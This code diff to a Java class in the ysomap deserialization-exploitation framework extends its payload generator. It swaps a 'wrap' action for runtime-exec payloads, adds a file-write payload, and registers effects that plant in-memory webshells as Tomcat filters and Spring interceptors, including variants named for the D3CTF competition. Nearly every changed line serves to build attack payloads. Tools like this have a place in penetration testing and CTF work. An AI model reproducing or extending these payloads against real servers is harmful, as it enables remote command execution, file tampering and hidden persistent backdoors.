@@ -5,9 +5,14 @@ import echo.TomcatEchoPayload;
 import javassist.ClassPool;
 import javassist.CtClass;
 import loader.*;
+import msshell.SpringInterceptor;
+import msshell.TomcatFilter;
+import msshell.TomcatFilterForD3ctf1;
+import msshell.TomcatFilterForD3ctf2;
 import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.jdk.TemplatesImplBullet;
 import ysomap.common.annotation.*;
+import ysomap.common.util.Logger;
 import ysomap.common.util.Strings;
 import ysomap.core.util.ClassFiles;
 import ysomap.core.util.FileHelper;
@@ -67,6 +72,7 @@ public class ClassWithExistEviClass extends AbstractBullet<byte[]> {
             Class<?> effectClazz = (Class) objs[0];
             if(classname == null){
                 classname = effectClazz.getSimpleName() + System.currentTimeMillis();
+                Logger.success("Generate class for name: "+classname);
             }
             code = process((String) objs[1], (String) objs[2], exception, body);
             cc = ClassFiles.makeClassFromExistClass(pool, effectClazz, null);
@@ -106,12 +112,15 @@ public class ClassWithExistEviClass extends AbstractBullet<byte[]> {
             return Arrays.toString((byte[]) data)
                     .replace("[", "")
                     .replace("]", "");
-        }else if("wrap".equals(action) && data instanceof String){
+        }else if("exec".equals(action) && data instanceof String){
             if("false".equals(exception)){
                 return PayloadHelper.makeRuntimeExecPayload((String) data);
             }else{
                 return PayloadHelper.makeExceptionPayload((String) data);
             }
+        }else if("fileWrite".equals(action) && data instanceof String[]){
+            String[] args = (String[]) data;
+            return PayloadHelper.makeFileWritePayload(args[0], args[1]);
         }
         return data;
     }
@@ -139,7 +148,8 @@ public class ClassWithExistEviClass extends AbstractBullet<byte[]> {
 
     static {
         effects = new HashMap<>();
-        effects.put("default", new Object[]{TemplatesImplBullet.StubTransletPayload.class, "%s", "wrap"});
+        effects.put("default", new Object[]{TemplatesImplBullet.StubTransletPayload.class, "%s", "exec"});
+        effects.put("FileWrite", new Object[]{TemplatesImplBullet.StubTransletPayload.class, "%s", "base64;fileWrite"});
         effects.put("TomcatEcho", new Object[]{TomcatEchoPayload.class, null, null});
         effects.put("SocketEcho",
                 new Object[]{SocketEchoPayload.class,
@@ -164,6 +174,18 @@ public class ClassWithExistEviClass extends AbstractBullet<byte[]> {
         effects.put("CustomizableClassLoader",
                 new Object[]{CustomizableClassLoader.class,
                         "classBae64Str = \"%s\";", "read;gzip;base64"});
+        effects.put("SpringInterceptor",
+                new Object[]{SpringInterceptor.class, null, null});
+        effects.put("TomcatFilter",
+                new Object[]{TomcatFilter.class,
+                        "uri = \"%s\";\nfilterName = \"%s\";\ndata = \"%s\";", "split"}); // uri;DefaultFilter;data
+        effects.put("TomcatFilterForD3ctf1",
+                new Object[]{TomcatFilterForD3ctf1.class,
+                        "uri = \"%s\";\nfilterName = \"%s\";\ndata = \"%s\";", "split"}); // uri;DefaultFilter;data
+        effects.put("TomcatFilterForD3ctf2",
+                new Object[]{TomcatFilterForD3ctf2.class,
+                        "uri = \"%s\";\nfilterName = \"%s\";\ndata = \"%s\";", "split"}); // uri;DefaultFilter;data
+
 
     }
 }
